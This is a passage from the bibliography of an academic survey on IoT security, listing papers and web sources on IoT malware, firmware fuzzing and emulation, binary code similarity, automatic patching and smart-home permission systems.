<p>[^3]: Wikipedia. Mirai(malware). Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTWlyYWlfKG1hbHdhcmUp">https://en.wikipedia.org/wiki/Mirai_(malware)<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^4]: Trevor, H. Internet of Things (IoT) History. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cucG9zdHNjYXBlcy5jb20vSW9ULWhpc3Rvcnkv">https://www.postscapes.com/IoT-history/<i class="fa fa-external-link-alt"></i></span>(accessed on 6 December 2019).Future Internet 2019, 12, 27 18 of 23</p>
<p>[^5]: Gan, G.; Lu, Z.; Jiang, J. Internet of things security analysis. In Proceedings of the International Conference on Internet Technology and Applications, Wuhan, China, 16–18 August 2011.</p>
<p>[^6]: Suo, H.; Wan, J.; Zou, C.; Liu, J. Security in the internet of things: A review. In Proceeding of the International Conference on Computer Science and Electronics Engineering, Hangzhou, China, 23–25 March 2012.</p>
<p>[^7]: Zhao, K., Ge; L. A survey on the internet of things security. In Proceedings of the 2013 Ninth International Conference on Computational Intelligence and Security, Leshan, China, 14–15 December 2013.</p>
<p>[^8]: Pescatore, J.; Shpantzer, G. Securing the Internet of Things Survey; SANS Institute: Bethesda, MD, USA, 2014;pp. 1–22.</p>
<p>[^9]: Balte, A.; Kashid, A.; Patil, B. Security issues in Internet of things (IoT): A survey. Int. J. Adv. Res. Comput.Sci. Softw. Eng. 2018, 5, 450–455.</p>
<p>[^10]: Ngu, A.H.; Gutierrez, M.; Metsis, V.; Nepal, S.; Sheng, Q.Z. IoT middleware: A survey on issues and enabling technologies. IEEE Int. Things J. 2016, 4, 1–20. [CrossRef]</p>
<p>[^11]: Yang, Y.; Wu, L.; Yin, G.; Li, L.; Zhao, H. A survey on security and privacy issues in Internet-of-Things. IEEE Int. Things J. 2017, 4, 1250–1258. [CrossRef]</p>
<p>[^12]: Alaba, F.A.; Othman, M.; Hashem, I.A.T.; Alotaibi, F. Internet of Things security: A survey. J. Net. Comput.Appl. 2017, 88, 10–28. [CrossRef]</p>
<p>[^13]: Zhang, Z.K.; Cho, M.C.Y.; Wang, C.W.; Hsu, C.W.; Chen, C.K.; Shieh, S. IoT security: ongoing challenges and research opportunities. In Proceedings of the 7th IEEE International Conference on Service-Oriented Computing and Applications, Matsue, Japan, 17–19 November 2014.</p>
<p>[^14]: Mahmoud, R.; Yousuf, T.; Aloul, F.; Zualkernan, I. Internet of things (IoT) security: Current status, challenges and prospective measures. In Proceedings of the 10th International Conference for Internet Technology and Secured Transactions (ICITST), London, UK, 14–16 December 2015.</p>
<p>[^15]: Fernandes, E.; Rahmati, A.; Eykholt, K.; Prakash, A. Internet of things security research: A rehash of old ideas or new intellectual challenges. IEEE Secur. Priv. 2017, 15, 79–84. [CrossRef]</p>
<p>[^16]: Al-Garadi, M.A.; Mohamed, A.; Al-Ali, A.; Du, X.; Guizani, M. A survey of machine and deep learning methods for internet of things (IoT) security. arXiv 2018, arXiv:1807.11023. Available online: <span class="exturl" data-url="aHR0cHM6Ly9hcnhpdi5vcmcvYWJzLzE4MDcuMTEwMjM=">https://arxiv.org/abs/1807.11023<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^17]: Alrawi, O.; Lever, C.; Antonakakis, M.; Monrose, F. Sok: Security evaluation of home-based IoT deployments. In Proceedings of the IEEE Symposium on Security and Privacy (SP), San Francisco, CA, USA, 19–23 May 2019.</p>
<p>[^18]: Xie, W.; Jiang, Y.; Tang, Y.; Ding, N.; Gao, Y. Vulnerability detection in IoT firmware: A survey. In Proceedings of the IEEE 23rd International Conference on Parallel and Distributed Systems (ICPADS), Shenzhen, China, 15–17 December 2017.</p>
<p>[^19]: Zheng, Y.; Wen, H.; Cheng, K.; Song, Z.W.; Zhu, H.S.; Sun, L.M. A Survey of IoT Device Vulnerability Mining Techniques. J. Cyber Secur. 2019, 4, 61–75. [CrossRef]</p>
<p>[^20]: Samsung. Samsung SmartThings. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuc21hcnR0aGluZ3MuY29tLw==">https://www.smartthings.com/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^21]: Google. Google Weave Project. Available online: <span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXJzLmdvb2dsZS5jb20vd2VhdmUv">https://developers.google.com/weave/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^22]: Apple Inc. Apple HomeKit. Available online: <span class="exturl" data-url="aHR0cDovL3d3dy5hcHBsZS5jb20vaW9zL2hvbWUv">http://www.apple.com/ios/home/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^23]: Home, A. Home Assistant. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuaG9tZS1hc3Npc3RhbnQuaW8=">https://www.home-assistant.io<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^24]: Mi Inc. IoT Developer Platform. Available online: <span class="exturl" data-url="aHR0cHM6Ly9Jb1QubWkuY29tLw==">https://IoT.mi.com/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^25]: WiFi, A. WiFi. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cud2ktZmkub3JnLw==">https://www.wi-fi.org/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^26]: Zigbee, A. Zigbee. Available online: <span class="exturl" data-url="aHR0cHM6Ly96aWdiZWUub3JnLw==">https://zigbee.org/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^27]: Bluetooth Technology Website. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuYmx1ZXRvb3RoLmNvbS8=">https://www.bluetooth.com/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^28]: Liu, X.; Zhou, Z.; Diao, W.; Li, Z.; hang, K. When good becomes evil: Keystroke inference with smartwatch. In Proceedings of the 22nd ACM SIGSAC Conference on Computer and Communications Security, Denver, CO, USA, 12–16 October 2015.</p>
<p>[^29]: Das, A.; Borisov, N.; Caesar M. Do you hear what i hear?: Fingerprinting smart devices through embedded acoustic components. In Proceedings of the ACM SIGSAC Conference on Computer and Communications Security, Scottsdale, AZ, USA, 3–7 November 2014. Future Internet 2019, 12, 27 19 of 23</p>
<p>[^30]: Vasyltsov, I.; Lee, S. Entropy extraction from bio-signals in healthcare IoT. In Proceedings of the 1st ACM Workshop on IoT Privacy, Trust, and Security, Singapore, 14 April 2015.</p>
<p>[^31]: McCann, D.; Eder, K.; Oswald, E. Characterising and comparing the energy consumption of side channel attack countermeasures and lightweight cryptography on embedded device. In Proceedings of the International Workshop on Secure Internet of Things (SIoT), Vienna, Austria, 21–25 September 2015.</p>
<p>[^32]: Stokes, P., SentinelOne. Checkm8: 5 Things You Should Know about the New Ios Boot Rom Exploit. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VudGluZWxvbmUuY29tL2Jsb2cvY2hlY2ttOC01LXRoaW5ncy15b3Utc2hvdWxkLWtub3ctbmV3LWlvcy1ib290JUVGJUJGJUJFcm9tLWV4cGxvaXQv">https://www.sentinelone.com/blog/checkm8-5-things-you-should-know-new-ios-boot￾rom-exploit/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^33]: MITRE Corp. Marvell WiFi. Available online: <span class="exturl" data-url="aHR0cHM6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3Zla2V5LmNnaT9rZXl3b3JkPStNYXJ2ZWxsK1dpRmk=">https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=+Marvell+WiFi<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^34]: Paganini, P. Million of Telestar Digital GmbH IoT Radio Devices Can Be Remotely Hacked. Available online:<span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eWFmZmFpcnMuY28vd29yZHByZXNzLzkxMDY5L2hhY2tpbmcvdGVsZXN0YXItSW9ULXJhZGlvLWRldmljZXMtaGFjay5odG1s">https://securityaffairs.co/wordpress/91069/hacking/telestar-IoT-radio-devices-hack.html<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^35]: MITRE Corp. CVE-2019-13473. Available online: <span class="exturl" data-url="aHR0cHM6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAxOS0xMzQ3Mw==">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13473<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^36]: MITRE Corp. CVE-2019-13474. Available online: <span class="exturl" data-url="aHR0cHM6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAxOS0xMzQ3NA==">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13474<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^37]: Costa Gondim, J.J.; de Oliveira Albuquerque, R.; Clayton Alves Nascimento, A.; García Villalba, L.J.;Kim, T.H. A methodological approach for assessing amplified reflection distributed denial of service on the internet of things. Sensors 2016, 16, 1855. [CrossRef] [PubMed]</p>
<p>[^38]: Wikipedia. Constrained Application Protocol. Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kv">https://en.wikipedia.org/wiki/<i class="fa fa-external-link-alt"></i></span> Constrained_Application_Protocol (accessed on 6 December 2019).</p>
<p>[^39]: UPnP Corp. UPnP Device Architecture 1.0. Available online: <span class="exturl" data-url="aHR0cDovL3d3dy51cG5wLm9yZy9zcGVjcy9hcmNoL1VQblAlRUYlQkYlQkVhcmNoLURldmljZUFyY2hpdGVjdHVyZS12MS4wLTIwMDgwNDI0LnBkZg==">http://www.upnp.org/specs/arch/UPnP￾arch-DeviceArchitecture-v1.0-20080424.pdf<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^40]: Li, C.; Cai, Q.; Li, J.; Liu, H.; Zhang, Y.; Gu, D.; Yu, Y. Passwords in the Air: Harvesting Wi-Fi Credentials from SmartCfg Provisioning. In Proceedings of the 11th ACM Conference on Security &amp; Privacy in Wireless and Mobile Networks, Stockholm, Sweden, 18–20 June 2018.</p>
<p>[^41]: Zhou, W.; Jia, Y.; Yao, Y.; Zhu, L.; Guan, L.; Mao, Y.; Zhang, Y. Phantom Device Attack: Uncovering the Security Implications of the Interactions among Devices, IoT Cloud, and Mobile Apps. arXiv 2018, arXiv:1811.03241.</p>
<p>[^42]: Vasile, S.; Oswald, D.; Chothia, T. Breaking All the Things—A Systematic Survey of Firmware Extraction Techniques for IoT Devices. In Proceedings of the International Conference on Smart Card Research and Advanced Applications, Montpellier, France, 12–14 November 2018.</p>
<p>[^43]: Zaddach, J.; Bruno, L.; Francillon, A.; Balzarotti, D. AVATAR: A Framework to Support Dynamic Security Analysis of Embedded Systems’ Firmwares. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 23–26 February 2014.</p>
<p>[^44]: Kammerstetter, M.; Platzer, C.; Kastner, W. Prospect: peripheral proxying supported embedded code <span class="exturl" data-url="aHR0cDovL3Rlc3RpbmcuSW4=">testing.In<i class="fa fa-external-link-alt"></i></span> Proceedings of the 9th ACM Symposium on Information, Computer and Communications Security, Kyoto, Japan, 3–6 June 2014.</p>
<p>[^45]: Koscher, K.; Kohno, T.; Molnar, D. SURROGATES: Enabling Near-Real-Time Dynamic Analyses of Embedded Systems. In Proceedings of the 9th USENIX Workshop on Offensive Technologies (WOOT 15), Washington, DC, USA, 10–11 August 2015.</p>
<p>[^46]: Muench, M.; Nisi, D.; Francillon, A.; Balzarotti, D. Avatar 2: A Multi-target Orchestration Platform. In Proceedings of the Workshop on Binary Analysis Research (colocated with NDSS Symposium), San Diego, CA, USA, 18 February 2018.</p>
<p>[^47]: Chen, D.D.; Woo, M.; Brumley, D.; Egele, M. Towards Automated Dynamic Analysis for Linux-based Embedded Firmware. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 21–24 February 2016.</p>
<p>[^48]: Bellard, F. QEMU, a fast and portable dynamic translator. In Proceedings of the USENIX Annual Technical Conference, Anaheim, CA, USA, 10–15 April 2005.</p>
<p>[^49]: Wikipedia. Fuzzing. Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvRnV6emluZw==">https://en.wikipedia.org/wiki/Fuzzing<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019). Future Internet 2019, 12, 27 20 of 23</p>
<p>[^50]: Wikipedia. Taint Checking. Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVGFpbnRfY2hlY2tpbmc=">https://en.wikipedia.org/wiki/Taint_checking<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^51]: King, J.C. Symbolic execution and program testing. Commun. ACM 1976, 19; 385–394. [CrossRef]</p>
<p>[^52]: Alimi, V.; Vernois, S.; Rosenberger, C. Analysis of embedded applications by evolutionary <span class="exturl" data-url="aHR0cDovL2Z1enppbmcuSW4=">fuzzing.In<i class="fa fa-external-link-alt"></i></span> Proceedings the 2014 International Conference on High Performance Computing &amp; Simulation (HPCS), Bologna, Italy, 21–25 July 2014.</p>
<p>[^53]: Kamel, N.; Lanet, J.L. Analysis of HTTP protocol implementation in smart card embedded web server. Int. J. Inf. Netw. Security (IJINS) 2013, 2, 417. [CrossRef]</p>
<p>[^54]: Koscher, K.; Czeskis, A.; Roesner, F.; Patel, S.; Kohno, T.; Checkoway, S.; McCoy, D.; Kantor, B.; Anderson, D;Shacham, H.; et al. Experimental security analysis of a modern automobile. In Proceedings of the IEEE Symposium on Security and Privacy (SP), Berkeley, CA, USA, 16–19 May 2010.</p>
<p>[^55]: Lee, H.; Choi, K.; Chung, K.; Kim, J.; Yim, K. Fuzzing can packets into automobiles. In Proceedings of the 29th International Conference on Advanced Information Networking and Applications, Gwangiu, Korea,24–27 March 2015.</p>
<p>[^56]: Wikipedia. CAN bus. Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvQ0FOX2J1cw==">https://en.wikipedia.org/wiki/CAN_bus<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^57]: Chen, J.; Diao, W.; Zhao, Q.; Zuo, C.; Lin, Z.; Wang, X.; Lau, W.C.; Sun, M.; Yang, R.; Zhang, K. IoTfuzzer:Discovering Memory Corruptions in IoT through App-Based Fuzzing. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 18–21 February 2018.</p>
<p>[^58]: Costin, A.; Zarras, A.; Francillon, A. Automated dynamic firmware analysis at scale: A case studyon embedded web interfaces. In Proceedings of the 11th ACM on Asia Conference on Computer and Communications Security, Xi’an, China, 30 May–3 June 2016.</p>
<p>[^59]: Srivastava, P.; Peng, H.; Li, J.; Okhravi, H.; Shrobe, H.; Payer, M. FirmFuzz: Automated IoT Firmware Introspection and Analysis. In Proceedings of the 2nd International ACM Workshop on Security and Privacy for the Internet-of-Things, London, UK, 15 November 2019.</p>
<p>[^60]: Zheng, Y.; Davanian, A.; Yin, H.; Song, C.; Zhu, H.; Sun, L. FIRM-AFL: high-throughput greybox fuzzing of IoT firmware via augmented process emulation. In Proceedings of the 28th USENIX Security Symposium (USENIX Security 19), Santa Clara, CA, USA, 14–16 August 2019.</p>
<p>[^61]: Zalewski, M. American Fuzzy Lop. Available online: <span class="exturl" data-url="aHR0cDovL2xjYW10dWYuY29yZWR1bXAuY3gvYWZs">http://lcamtuf.coredump.cx/afl<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^62]: Muench, M.; Stijohann, J.; Kargl, F.; Francillon, A.; Balzarotti, D. What You Corrupt Is Not What You Crash: Challenges in Fuzzing Embedded Devices. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 18–21 February 2018.</p>
<p>[^63]: Dolan-Gavitt, B.; Hodosh, J.; Hulin, P.; Leek, T.; Whelan, R. Repeatable reverse engineering with <span class="exturl" data-url="aHR0cDovL1BBTkRBLklu">PANDA.In<i class="fa fa-external-link-alt"></i></span> Proceedings of the 5th Program Protection and Reverse Engineering Workshop, Los Angeles, CA, USA,15 December 2015.</p>
<p>[^64]: Costin, A.; Zaddach, J.; Francillon, A.; Balzarotti, D. A large-scale analysis of the security of embedded firmwares. In Proceedings of the 23rd USENIX Security Symposium (USENIX Security 14), San Diego, CA, USA, 20–22 August 2014.</p>
<p>[^65]: Davidson, D.; Moench, B.; Ristenpart, T.; Jha, S. FIE on Firmware: Finding Vulnerabilities in Embedded Systems Using Symbolic Execution. In Proceedings of the 22nd USENIX Security Symposium (USENIX Security 13), Washington, DC, USA, 14–16 August 2013.</p>
<p>[^66]: Celik, Z.B.; Babun, L.; Sikder, A.K.; Aksu, H.; Tan, G.; McDaniel, P.; Uluagac, A.S. KLEE: Unassisted and Automatic Generation of High-Coverage Tests for Complex Systems Programs. In Proceedings of the 8th USENIX Symposium on Operating Systems Design and Implementation(OSDI 2008), San Diego, CA, USA, 8–10 December 2008.</p>
<p>[^67]: Shoshitaishvili, Y.; Wang, R.; Hauser, C.; Kruegel, C.; Vigna, G. Firmalice-Automatic Detection of Authentication Bypass Vulnerabilities in Binary Firmware. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 8–11 February 2015.</p>
<p>[^68]: Celik, Z.B.; Babun, L.; Sikder, A.K.; Aksu, H.; Tan, G.; McDaniel, P.; Uluagac, A.S. Sensitive information tracking in commodity IoT. In Proceedings of the 27th USENIX Security Symposium (USENIX Security 18), Baltimore, MD, USA, 15–17 August 2018. Future Internet 2019, 12, 27 21 of 23</p>
<p>[^69]: Cheng, K.; Li, Q.; Wang, L.; Chen, Q.; Zheng, Y.; Sun, L.; Liang, Z. DTaint: detecting the taint-style vulnerability in embedded device firmware. In Proceedings of the 48th Annual IEEE/IFIP International Conference on Dependable Systems and Networks (DSN), Luxembourg, 25–28 June 2018.</p>
<p>[^70]: Cui, A.; Stolfo, S.J. A quantitative analysis of the insecurity of embedded network devices: results of a wide-area scan. In Proceedings of the 26th Annual Computer Security Applications Conference, Austin, TX, USA, 6–10 December 2010.</p>
<p>[^71]: Al-Alami, H;, Ali, H.; Hussein, A.B. Vulnerability scanning of IoT devices in Jordan using Shodan. In Proceedings of the 2nd International Conference on the Applications of Information Technology in Developing Renewable Energy Processes &amp; Systems (IT-DREPS), Amman, Jordan, 6–7 December 2017.</p>
<p>[^72]: Durumeric, Z.; Adrian, D.; Mirian, A.; Bailey, M.; Halderman, J.A. A search engine backed by Internet-wide scanning. In Proceedings of the 22nd ACM SIGSAC Conference on Computer and Communications Security, Denver, CO, USA, 12–16 October 2015.</p>
<p>[^73]: Knownsec, Inc. Zoomeye. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuem9vbWV5ZS5vcmcv">https://www.zoomeye.org/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^74]: Li, Z.; Lu, S.; Myagmar, S.; Zhou, Y. CP-Miner: A Tool for Finding Copy-paste and Related Bugs in Operating System Code. In Proceedings of the 6th Symposium on Operating System Design and Implementation (OSDI 2004), San Francisco, CA, USA, 6–8 December 2004.</p>
<p>[^75]: Jang, J.; Agrawal, A.; Brumley, D. ReDeBug: finding unpatched code clones in entire os distributions. In Proceedings of the IEEE Symposium on Security and Privacy (SP), San Francisco, CA, USA, 20–23 May 2012.</p>
<p>[^76]: Wikipedia. N-gram. Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTi1ncmFt">https://en.wikipedia.org/wiki/N-gram<i class="fa fa-external-link-alt"></i></span> (accessed on 6December 2019).</p>
<p>[^77]: Myles, G.; Christian, C. K-gram based software birthmarks. In Proceedings of the 2005 ACM Symposium on Applied Computing, Santa Fe, NM, USA, 13–17 March 2005.</p>
<p>[^78]: Khoo, W.M.; Mycroft, A.; Anderson R. Rendezvous: A search engine for binary code. In Proceedings of the 10th Working Conference on Mining Software Repositories, San Francisco, CA, USA, 18–19 May 2013.</p>
<p>[^79]: Karim, M.E.; Walenstein, A.; Lakhotia, A.; Parida, L. Malware phylogeny generation using permutations of code. J. Comput. Virol. 2005, 1, 13–23. [CrossRef]</p>
<p>[^80]: David, Y.; Yahav, E. Tracelet-based code search in executables. Acm Sigplan Notices 2014, 49, 349–360.[CrossRef]</p>
<p>[^81]: Pewny, J.; Schuster, F.; Bernhard, L.; Holz, T.; Rossow, C. Leveraging semantic signatures for bug search in binary programs. In Proceedings of the 30th Annual Computer Security Applications Conference, New Orleans, LA, USA, 8–12 December 2014.</p>
<p>[^82]: Allen, F.E. Control flow analysis. ACM Sigplan Notices 1970, 55, 7. [CrossRef]</p>
<p>[^83]: Dullien, T.; Rolles, R. Graph-based comparison of executable objects. In Proceedings of the SSTIC’05, Rennes, France, 1–3 July 2005.</p>
<p>[^84]: Bourquin, M.; King, A.; Robbins, E. Binslayer: accurate comparison of binary executables. In Proceedings of the 2nd ACM SIGPLAN Program Protection and Reverse Engineering Workshop, Rome, Italy, 26 January 2013.</p>
<p>[^85]: Egele, M.; Woo, M.; Chapman, P.; Brumley, D. Blanket execution: Dynamic similarity testing for program binaries and components. In Proceedings of the 23rd USENIX Security Symposium (USENIX Security 14), San Diego, CA, USA, 20–22 August 2014.</p>
<p>[^86]: Gao, D.; Reiter, M.K.;Song, D. Binhunt: Automatically finding semantic differences in binary programs. In Proceedings of the International Conference on Information and Communications Security, Birmingham, UK, 20–22 October 2008.</p>
<p>[^87]: Ming, J.; Pan, M.; Gao, D. iBinHunt: Binary hunting with inter-procedural control flow. In Proceedings of the International Conference on Information Security and Cryptology, Seoul, Korea, 28–30 November 2012.</p>
<p>[^88]: Pewny, J.; Garmany, B.; Gawlik, R.; Rossow, C.; Holz, T. Cross-architecture bug search in binary executables. In Proceedings of the IEEE Symposium on Security and Privacy (SP), San Jose, CA, USA, 17–21 May 2015.</p>
<p>[^89]: Eschweiler, S.; Yakdan, K.; Gerhards-Padilla, E. discovRE: Efficient Cross-Architecture Identification of Bugs in Binary Code. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 21–24 February 2016.Future Internet 2019, 12, 27 22 of 23</p>
<p>[^90]: Chandramohan, M.; Xue, Y.; Xu, Z.; Liu, Y.; Cho, C.Y.; Tan, H.B.K. Bingo: Cross-architecture cross-os binary search. In Proceedings of the 24th ACM SIGSOFT International Symposium on Foundations of Software Engineering, Seattle, WA, USA, 13–18 November 2016.</p>
<p>[^91]: Feng, Q.; Zhou, R.; Xu, C.; Cheng, Y.; Testa, B.; Yin, H. Scalable graph-based bug search for firmware images. In Proceedings of the ACM SIGSAC Conference on Computer and Communications Security, Vienna, Austria, 24–28 October 2016.</p>
<p>[^92]: Yan, S.; Xu, D.; Zhang, B.; Zhang, H.J.; Yang, Q.; Lin, S. Graph embedding and extensions: A general framework for dimensionality reduction. IEEE Transact. Pattern Anal. Mach. Intell. 2007, 29, 40–51. [CrossRef]</p>
<p>[^93]: Xu, X.; Liu, C.; Feng, Q.; Yin, H.; Song, L.; Song, D. Neural network-based graph embedding for cross-platform binary code similarity detection. In Proceedings of the ACM SIGSAC Conference on Computer and Communications Security, Dallas, TX, USA, 30 October–3 November 2017.</p>
<p>[^94]: Liu, B.; Huo, W.; Zhang, C.; Li, W.; Li, F.; Piao, A.; Zou, W. αDiff: cross-version binary code similarity detection with DNN. In Proceedings of the 33rd ACM/IEEE International Conference on Automated Software Engineering, Montpellier, France, 3–7 September 2018.</p>
<p>[^95]: Gao, J.; Yang, X.; Fu, Y.; Jiang, Y.; Sun, J. Vulseeker: a semantic learning based vulnerability seeker for cross-platform binary. In Proceedings of the 33rd ACM/IEEE International Conference on Automated Software Engineering, Montpellier, France, 3–7 September 2018.</p>
<p>[^96]: Gao, J.; Yang, X.; Fu, Y.; Jiang, Y.; Shi, H.; Sun, J. Vulseeker-pro: enhanced semantic learning based binary vulnerability seeker with emulation. In Proceedings of the 26th ACM Joint Meeting on European Software Engineering Conference and Symposium on the Foundations of Software Engineering, Tallinn, Estonia, 26–30 August 2019.</p>
<p>[^97]: Long, F.; Rinard, M. Prophet: Automatic Patch Generation via Learning from Successful Patches. <span class="exturl" data-url="aHR0cHM6Ly9jb3JlLmFjLnVrL2Rvd25sb2FkL3BkZi83ODA2Mjk0NS5wZGY=">https://core.ac.uk/download/pdf/78062945.pdf<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^98]: Long, F.; Rinard, M. Automatic patch generation by learning correct code. In Proceedings of the 43rd Annual ACM SIGPLAN-SIGACT Symposium on Principles of Programming Languages, St. Petersburg, FL, USA, 20–22 January 2016.</p>
<p>[^99]: Long, F.; Amidon, P.; Rinard, M. Automatic inference of code transforms for patch generation. In Proceedings of the 11th Joint Meeting on Foundations of Software Engineering, Paderborn, Germany, 4–8 September 2017.</p>
<p>[^100]: Le Goues, C.; Nguyen, T.; Forrest, S.; Weimer, W. Genprog: A generic method for automatic software repair. IEEE Trans. Soft. Eng. 2011, 38, 54–72. [CrossRef]</p>
<p>[^101]: Kim, D.; Nam, J.; Song, J.; Kim, S. Automatic patch generation learned from human-written patches. In Proceedings of the International Conference on Software Engineering, San Francisco, CA, USA, 18–26 May 2013.</p>
<p>[^102]: Zhang, Y.; Chen, Y.; Bao, C.; Xia, L.; Zhen, L.; Lu, Y.; Wei, T. Adaptive kernel live patching: An open collaborative effort to ameliorate android n-day root exploits. In Proceedings of Black Hat USA, Las Vegas, NA, USA, 30 July–4 August 2016.</p>
<p>[^103]: DARPA. Cyber Grand Challenge. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGFycGEubWlsL3Byb2dyYW0vY3liZXItZ3JhbmQlRUYlQkYlQkVjaGFsbGVuZ2U=">https://www.darpa.mil/program/cyber-grand￾challenge<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^104]: Shoshitaishvili, Y.; Bianchi, A.; Borgolte, K.; Cama, A.; Corbetta, J.; Disperati, F.; Dutcher, A.; Grosen, J.;Grosen, P.;Machiry, A.; etc. Mechanical phish: Resilient autonomous hacking. IEEE Secur. Priv. 2018, 16, 12–22. [CrossRef]</p>
<p>[^105]: Shoshitaishvili, Y.; Weissbacher, M.; Dresel, L.; Salls, C.; Wang, R.; Kruegel, C.; Vigna, G. Rise of the hacrs: Augmenting autonomous cyber reasoning systems with human assistance. In Proceedings of the ACM SIGSAC Conference on Computer and Communications Security, Dallas, TX, USA, 30 October–3 November 2017.</p>
<p>[^106]: Nguyen-Tuong, A.; Melski, D.; Davidson, J.W.; Co, M.; Hawkins, W.; Hiser, J.D.;Morris, D.; Nguyen, D.; Rizzi, E. Xandra: An Autonomous Cyber Battle System for the Cyber Grand Challenge. IEEE Secur. Priv.2018, 16, 42–51. [CrossRef]</p>
<p>[^107]: Fernandes, E.; Jung, J.; Prakash, A. Security analysis of emerging smart home applications. In Proceedings of the IEEE Symposium on Security and Privacy (SP), San Jose, CA, USA, 22–26 May 2016.</p>
<p>[^108]: Fernandes, E.; Paupore, J.; Rahmati, A.; Simionato, D.; Conti, M.; Prakash, A. Flowfence: Practical data protection for emerging IoT application frameworks. In Proceedings of the 25th USENIX Security Symposium (USENIX Security 16), Austin, TX, USA, 10–12 August 2016. Future Internet 2019, 12, 27 23 of 23</p>
<p>[^109]: Jia, Y.J.; Chen, Q.A.; Wang, S.; Rahmati, A.; Fernandes, E.; Mao, Z.M.; Prakash, A. ContexloT: Towards Providing Contextual Integrity to Appified IoT Platforms. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 26 February–1 March 2017.</p>
<p>[^110]: Rahmati, A.; Fernandes, E.; Eykholt, K.; Prakash, A. Tyche: A risk-based permission model for smart homes. In Proceedings of the IEEE Cybersecurity Development (SecDev), Cambridge, MA, USA, 30 September–2 October 2018.</p>
<p>[^111]: Tian, Y.; Zhang, N.; Lin, Y.H.; Wang, X.; Ur, B.; Guo, X.; Tague, P. Smartauth: User-centered authorization for the internet of things. In proceedings of the 26th USENIX Security Symposium (USENIX Security 17), Vancouver, BC, Canada, 16–18 August 2017.</p>
<p>[^112]: Lee, S.; Choi, J.; Kim, J.; Cho, B.; Lee, S.; Kim, H.; Kim, J. FACT: Functionality-centric access control system for IoT programming frameworks. In Proceedings of the 22nd ACM on Symposium on Access Control Models and Technologies, Indianapolis, IN, USA, 21–23 June 2017.</p>
<p>[^113]: Cui, A.; Costello, M.; Stolfo, S. When firmware modifications attack: A case study of embedded exploitation. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 24–27 February 2013.</p>
<p>[^114]: Goodfellow, I.; Pouget-Abadie, J.; Mirza, M.; Xu, B.; Warde-Farley, D.; Ozair, S.; Courville, A.; Bengio, Y. Generative adversarial nets. In Proceedings of the Advances in Neural Information Processing Systems 27 (NIPS 2014), Montreal, QC, Canada, 8–13 December 2014.</p>
